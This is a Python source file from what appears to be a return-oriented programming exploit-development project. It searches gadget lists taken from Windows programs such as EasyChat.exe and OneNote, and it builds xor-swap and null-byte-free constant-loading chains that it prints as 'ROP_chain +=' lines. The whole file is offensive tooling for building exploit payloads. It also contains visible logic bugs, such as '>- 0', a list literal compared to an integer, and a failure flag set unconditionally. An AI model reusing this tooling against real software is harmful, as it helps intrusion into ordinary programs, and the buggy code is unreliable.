from imports.Processes import *
from imports.Rop_File_Intake import *
from imports.Graphing_functions import *
from imports.ROP_Counting_Functions import *
from imports.Count_Side_Effects import *

import ropgadget
import os.path
from os import system, getcwd, chdir
import sys
import re
from textwrap import wrap

# f = "C:\\Users\\User\\Desktop\\ROP_Project\\Gadget_Sets\\EasyChat.exe_ROP\\EasyChat.exe_ROP_Gadgets.txt"
# f = "C:\\Users\\User\\Desktop\\ROP_Project\\Gadget_Sets\\PEview.exe_ROP\\PEview.exe_ROP_Gadgets.txt"
# f = "C:\\Users\\User\\Desktop\\ROP_Project\\Gadget_Sets\\one_note_ROP\\one_note_ROP_Gadgets.txt"
# f = "C:\\Users\\User\\Desktop\\ROP_Project\\Gadget_Sets\\frhed.exe_ROP\\frhed.exe_ROP_Gadgets.txt"
# f = "C:\\Users\\User\\Desktop\\ROP_Project\\Gadget_Sets\\one_note_ROP\\one_note_ROP_Gadgets.txt"

# gadgets = process_rop_file(f)

def is_sf_recoverable(instruction):
	recoverable = ['inc', 'dec', 'mov', 'xor', 'pop']
	no_action = ['test', 'cld', 'nop']

	if instruction.find('ptr [') >= 0: # for right now, dismiss any gadget with derefrenced registers
		return 0                  # the reg would need to be a correct address

	for r in no_action:
		if instruction.find(r) >- 0:
			return 2

	for r in recoverable:
		if instruction.find(r) >= 0:
			return 1
	return 0


def recover_side_effect(rop_list, instruction, reg1, reg2=None):
	no_action = ['test', 'cld', 'nop']
	for i in no_action:
		if i.find(instruction) >= 0:
			return 1

	# determine the oppisite instruction
	new_instruction = {}
	new_instruction['mov'] = "mov" 
	new_instruction['inc'] = "dec" 
	new_instruction['dec'] = "inc"
	new_instruction['xor'] = 'xor'

	# determine how the registers need to be for the new instruction
	new_regs = {}
	new_regs['mov'] = [reg2, reg1]
	new_regs['inc'] = [reg1]
	new_regs['dec'] = [reg1]
	new_regs['xor'] = [reg1, reg2]

	# adjust function call for 1 or 2 registers.
	try:
		
		if len(new_regs[instruction]) == 2:
			a = get_best_gadget_binary(rop_list, new_instruction[instruction], new_regs[instruction][0], new_regs[instruction][1])

		elif len(new_regs[instruction]) == 1:
			a = get_best_gadget_binary(rop_list, new_instruction[instruction], new_regs[instruction][0], None)

	except Exception as e:
		print("The Instruction isnt working :/")
		return 0

	if a['SE_len'] == 0:
		return a
	elif ['SE_len'] == 1:
		# fix side effect in fix for side effect
		# set warning that the side effect will be manually reversed
		return a
	else:
		print("Too many side effects to be efficent")
		return None

	# if zero side effects return it 
	#if one additional side efect, try to resolve it
	#if two or more side effects, throw it out as it's probably not wort using


def xor_swap(rop_list, reg1, reg2):
	chain = []
	address_chain = []

	if reg1 == reg2:
		return 0

	# make a list for each configuration of xor
	test1 = best_gadget_list(rop_list, "xor", reg1, reg2)
	test2 = best_gadget_list(rop_list, "xor", reg2, reg1)

	# the largest return value accepted
	acceptable_ret = 8

	# if one xor gadget isn't found, the algorithm won't work
	if test1 == 0 or test2 == 0:
		print("Not Enough Gadgets")
		return 0
	else:
		# variables for each part making up the gadget chain
		first_gadget = ""
		first_fixes = []
		first_addresses = []

		second_gadget = ""
		second_fixes = []
		second_addresses = []

		address_chain = []

		# find first xor gadget
		SE = 0
		for i in range(0, len(test1)): # each xor instruction for first configuration
			SE = len(test1[i]["Gadget"])-2 # number of side effects minus xor and return
			for s in range(1, len(test1[i]["Gadget"])-1): # each side effect
				if is_sf_recoverable(test1[i]["Gadget"][s]) >= 1 :
					SE -= 1

			if SE == 0 and test1[i]['Ret_len'] <= acceptable_ret:
				first_gadget = (test1[i]["Gadget"])
				first_addresses.append(test1[i]["Address"])

				for se in range(1, len(test1[i]["Gadget"])-1): # each side effect
					if test1[i]["Gadget"][se].find(',') >= 0:
						pass # two registers
					else:
						p = test1[i]["Gadget"][se].split(' ')
						fix = recover_side_effect(rop_list,p[1],p[2])
						if fix == 1:
							pass
						elif fix is not None:
							first_addresses.append(fix['Address'])
							first_fixes.append(fix['Gadget'])
						# print("fix")
						# print(fix)

					# fix = recover_side_effect()

				break # if all side effects good, use this gadget
		if first_gadget == "":
			print("The Algorithm didn't work")
			return 0

		second_gadget = ""
		SE = 0
		for i in range(0,len(test2)): # each xor instruction
			SE = len(test2[i]["Gadget"])-2
			for s in range(1, len(test2[i]["Gadget"])-1): # each side effect
				if is_sf_recoverable(test2[i]["Gadget"][s]) == 1:
					SE = SE - 1

			if SE == 0 and test2[i]['Ret_len'] <= acceptable_ret: # all side effects are alright as well at ret length
				second_gadget = test2[i]["Gadget"]
				second_addresses.append(test2[i]["Address"])
				for se in range(1, len(test2[i]["Gadget"])-1): # each side effect
					if test2[i]["Gadget"][se].find(',') >= 0:
						pass # two registers
					else:
						p = test2[i]["Gadget"][se].split(' ')
						fix = recover_side_effect(rop_list,p[1],p[2])
						second_addresses.append(fix['Address'])
						second_fixes.append(fix['Gadget'])

				break
		if second_gadget == "":
			print("Algorithm didnt work")
			return 0

		print('\n')
		print('---Instructions---')

		print(first_gadget)
		for i in first_fixes:
			print(i)

		print(second_gadget)
		for i in second_fixes:
			print(i)

		print(first_gadget)
		for i in first_fixes:
			print(i)

		for i in first_addresses:
			address_chain.append(i)

		for i in second_addresses:
			address_chain.append(i)

		for i in first_addresses:
			address_chain.append(i)

		print('---Addresses---')

		for i in address_chain:
			print("ROP_chain += (" + i + ")")


# xor_swap(gadgets, "eax", "edi")
# xor_swap(gadgets, "eax", "edi")
# recover_side_effect(gadgets, "dec","ecx",)

def hex_constant(rop_list, reg, constant):
	#avoid reg xor reg instructions as they will always equal zero
	remove = 9
	all_regs = ['eax', 'ebx', 'ecx', 'edx', 'esi', 'edi']
	for i in range(0, len(all_regs)):
		if all_regs[i] == reg:
			remove = i
	all_regs.pop(remove)

	#find the two values to load into register
	xor_constant = 0x11111111
	null_free = 0

	# make sure no null bytes exist in values to add to stack
	while null_free == 0:
		second_value = xor_constant ^ constant
		second_value = ("{0:#0{1}x}".format(second_value, 10))

		all_bytes = wrap(second_value, 2)

		if '00' not in all_bytes:
			null_free = 1
		else:
			null_free = 0
			xor_constant += 0x11111111 # increase the value to try to remove nulls again
	xor_constant = ("{0:#0{1}x}".format(xor_constant, 10))


	best_sf = 999
	best_gadget = ""
	second_reg = ""

	for r in all_regs:
		# print(get_best_gadget_binary(rop_list,'xor',reg,r))
		a = get_best_gadget_binary(rop_list,'xor',r,reg)
		if a is not None:
			if best_sf > a['SE_len']:
				best_sf = a['SE_len']
				best_gadget = a['Gadget']
				second_reg = r
	if second_reg == "":
		print("None avaliable")
		return 0

	xor_gadget_list = best_gadget_list(rop_list, 'xor', reg, second_reg)
	pop_target = best_gadget_list(rop_list, 'pop', reg)
	pop_second = best_gadget_list(rop_list, 'pop', second_reg)


	gadget_sets = [pop_target, pop_second, xor_gadget_list]
	saved_gadgets = []

	failed = 0
	acceptable_ret = 16
	for gadget_list in gadget_sets:
		SE = 0
		for i in range(0, len(gadget_list)):
			SE = len(gadget_list[i]['Gadget']) - 2

			for s in range(1, len(gadget_list[i]['Gadget'])-1):
				if is_sf_recoverable(gadget_list[i]["Gadget"][s]) == 1:
					SE -= 1		

			if SE == 0 and gadget_list[i]['Ret_len'] <= acceptable_ret:
				saved_gadgets.append(gadget_list[i])
				for se in range(1, len(gadget_list[i]["Gadget"])-1): # each side effect
					if gadget_list[i]["Gadget"][se].find(',') >= 0:
						pass # two registers
					else:
						p = gadget_list[i]["Gadget"][se].split(' ')
						fix = recover_side_effect(rop_list,p[1],p[2])
						if fix is not None:
							saved_gadgets.append(fix)
				break
			failed = 1
				# first_addresses.append(test1[i]["Addy"])
				# print(test1[i]["Module"])		
	# print(saved_gadgets)

	# for i in saved_gadgets:
	# 	print(i['Gadget'])
	if failed == 1:
		print("Couldn't do it :/")
		return 0

	addresses = []
	total_chain = []
	for i in saved_gadgets:
		total_chain.append(i['Gadget'])
		addresses.append(i['Address'])
		for g in i['Gadget']:	
			if g == " pop " + reg + ' ':
				total_chain.append(xor_constant)
			elif g == ' pop ' + second_reg + ' ':
				total_chain.append(second_value)

	print('\n')
	print("---Instructions---")
	for i in range(len(total_chain)):
		print(((total_chain[i])))
	print('\n')

	print("---Address chain---")
	for i in addresses:
		print("ROP_chain += (" + str(i) + ")")
	print('\n')



# hex_constant(gadgets,"eax", 0x123123)